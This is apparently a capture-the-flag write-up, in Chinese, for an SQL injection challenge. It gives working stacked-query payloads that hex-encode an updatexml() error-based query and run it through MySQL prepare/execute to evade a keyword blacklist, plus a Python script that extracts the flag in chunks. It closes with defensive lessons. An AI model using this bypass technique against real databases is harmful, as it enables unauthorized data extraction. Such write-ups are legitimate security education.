# ez_sqli

## 题目简述

`order` 参数被直接拼进 `ORDER BY`。应用删除空白并过滤常见 SQL 关键词，但只用 `re.match(r"id|name|email", field)` 检查开头；同时 MySQLdb 连接允许堆叠语句。可让输入以 `id` 开头，再把含敏感关键词的查询编码成十六进制，由 MySQL 的预处理语句在数据库端还原执行。

## 解题过程

外层载荷只使用未被过滤的 `set`、`prepare`、`from` 和 `execute`。真正的报错查询先转成十六进制，因此 WAF 看不到其中的 `select`、`flag` 等文本：

```sql
id;
set/**/@a=0x<inner_sql_hex>;
prepare/**/stmt/**/from/**/@a;
execute/**/stmt;
```

`/**/` 在应用删除空白后仍可充当 MySQL 词法分隔符。内层使用 `updatexml()` 制造包含查询结果的 XPath 错误；由于错误信息长度有限，分段读取 flag：

```sql
select updatexml(
  1,
  concat(0x7e, (select substr(flag, 1, 30) from flag), 0x7e),
  1
)
```

下面的脚本生成并发送两个分段载荷，`requests` 会负责 URL 编码：

```python
import requests

base_url = "http://target/"

for start in (1, 31):
    inner = (
        "select updatexml(1,concat(0x7e,"
        f"(select substr(flag,{start},30) from flag),"
        "0x7e),1)"
    )
    outer = (
        "id;set/**/@a=0x" + inner.encode().hex() +
        ";prepare/**/stmt/**/from/**/@a;execute/**/stmt;"
    )
    response = requests.get(base_url, params={"order": outer})
    print(response.text)
```

应用以 Flask debug 模式运行，数据库异常会出现在响应中。依次提取两段波浪号之间的内容并拼接，即可得到完整 flag。

## 方法总结

字符串黑名单无法安全约束 SQL 语法，十六进制字符串、注释和服务端预处理都能改变“检查时”与“执行时”的表示。`ORDER BY` 列名不能通过普通值占位符参数化时，应使用固定白名单映射；数据库驱动还应关闭多语句执行，并在生产环境禁用调试错误回显。
